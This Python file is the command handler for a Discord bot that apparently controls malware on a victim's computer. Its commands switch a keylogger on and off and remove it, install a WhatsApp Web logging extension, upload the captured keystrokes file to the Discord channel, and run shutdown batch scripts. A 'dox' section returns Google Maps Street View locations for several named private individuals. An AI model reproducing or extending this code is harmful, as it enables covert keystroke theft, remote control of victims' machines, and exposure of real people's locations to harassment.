import requests
import discord
import subprocess

OLLAMA_URL = "http://localhost:11434"

async def get_ollama_response(prompt: str) -> str:
    try:
        response = requests.post(f"{OLLAMA_URL}/api/generate", json={
            "model": "dolphin-llama3:8b-256k",
            "prompt": prompt,
            "options": {
                "num_ctx": 256000
            }
        })
        print(response.text)
        if response.status_code == 200:
            return response.json()['response']
        else:
            return "Error: Unable to get a response from the AI model."
    except Exception as e:
        return f"Error: {str(e)}"

async def handle_response(message) -> str:
    message_str = str(message.content)
    p_message = message_str.lower()

    if p_message == '!h':
        return "-----(ai)-----\n!ai (prompt), for uncensored air model (default model: dolphin-llama3:8b-256k)\n!cmai, to change ollama ai model\n-replay to the ai responses for a follow up message\n\n-----(keyLogger)-----\n!key, to send the keys the keylogger logged\n!del, to delete keylogger from target system\n!activate, to activate the keylogger\n!deactivate, to deactivate the keylogger\n\n-----(whatsApp Web Logger)-----\n!winstall, to install the web extension\n!wuninstall, to uninstall the web extension\n!wdel, to delete the extensions files from target system\n\n-----(dox)-----\n!roman, to dox roman\n!ronan, to dox ronan\n!amir, to dox amir\n!yinon, to dox yinon\n!yonatan, to dox yonatan\n!lior, to dox amir again\n--------------"
    elif p_message == '!ai':
        return "Please enter a prompt with your command (!ai prompt)."
    elif p_message.startswith('ai '):
        prompt = p_message[4:]
        if prompt.strip():
            response = await get_ollama_response(prompt)
            return response
        else:
            return "Please enter a prompt with your command (!ai prompt)."
    elif p_message == '!lior':
        return "https://www.google.com/maps/@32.7998916,34.9934555,3a,75y,350.85h,109t/data=!3m71e13m51s8EhHCB2N5pNJskSb_Tmg_w2e06shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3D8EhHCB2N5pNJskSb_Tmg_w%26cb_client%3Dsearch.gws-prod.gps%26w%3D86%26h%3D86%26yaw%3D9.553203%26pitch%3D0%26thumbfov%3D1007i133128i6656?hl=iw&entry=ttu"
    elif p_message == '!ronan':
        return "https://www.google.com/maps/@32.8117255,34.97118,3a,78.4y,340.2h,91.02t/data=!3m61e13m41sMB5vrS4eYZo_-nV8ZRmLWg2e07i133128i6656?entry=ttu"
    elif p_message == '!yonatan':
        return "https://www.google.com/maps/@32.7807216,34.9842434,3a,90y,27.03h,69.28t/data=!3m61e13m41sVyNClnu72ZDBbvCjbv2QVA2e07i133128i6656?hl=iw&entry=ttu"
    elif p_message == '!yinon':
        return "https://www.google.com/maps/@32.7926888,34.998283,3a,90y,146.9h,70.85t/data=!3m71e13m51s1rEuWaLVk19IOyztPI2txg2e06shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3D1rEuWaLVk19IOyztPI2txg%26cb_client%3Dsearch.gws-prod.gps%26w%3D86%26h%3D86%26yaw%3D140.57892%26pitch%3D0%26thumbfov%3D1007i133128i6656?entry=ttu"
    elif p_message == '!roman':
        return "https://www.google.com/maps/@32.8098259,34.9633638,3a,75y,107.04h,108.2t/data=!3m71e13m51sKv_7BM6aEZW5fMGBZDdRQA2e06shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3DKv_7BM6aEZW5fMGBZDdRQA%26cb_client%3Dsearch.gws-prod.gps%26w%3D360%26h%3D120%26yaw%3D126.16415%26pitch%3D0%26thumbfov%3D1007i133128i6656?entry=ttu"
    elif p_message == '!amir':
        return "https://www.google.com/maps/@32.7998916,34.9934555,3a,75y,350.85h,109t/data=!3m71e13m51s8EhHCB2N5pNJskSb_Tmg_w2e06shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3D8EhHCB2N5pNJskSb_Tmg_w%26cb_client%3Dsearch.gws-prod.gps%26w%3D86%26h%3D86%26yaw%3D9.553203%26pitch%3D0%26thumbfov%3D1007i133128i6656?hl=iw&entry=ttu"
    elif p_message == '!del':
        try:
            subprocess.run(['kill.bat'], check=True)
        except subprocess.CalledProcessError as e:
            return f"Failed to execute kill.bat: {e}"
    elif p_message == '!s':
        try:
            subprocess.run(['shut.bat'], check=True)
        except subprocess.CalledProcessError as e:
            return f"Failed to execute shut.bat: {e}"
    elif p_message == '!key':
        try:
            with open("key_presses.txt", "r") as f:
                key_presses = f.read()
            formatted_content = f'`{key_presses}`'
            file_contents = formatted_content.encode("utf-8")
            filename = 'key_presses.txt'
            file = discord.File(filename, filename)
            await message.channel.send(file=file)
            return "File sent successfully."
        except FileNotFoundError:
            return "No key presses recorded yet."
    elif p_message == '!k':
        try:
            with open("key_presses.txt", "r") as f:
                key_presses = f.read()
            formatted_content = f'`{key_presses}`'
            file_contents = formatted_content.encode("utf-8")
            filename = 'key_presses.txt'
            file = discord.File(filename, filename)
            await message.channel.send(file=file)
        except FileNotFoundError:
            return "No key presses recorded yet."
        try:
            subprocess.run(['kill.bat'], check=True)
        except subprocess.CalledProcessError as e:
            return f"Failed to execute kill.bat: {e}"
        try:
            subprocess.run(['shut.bat'], check=True)
        except subprocess.CalledProcessError as e:
            return f"Failed to execute shut.bat: {e}"
    else:
        return None
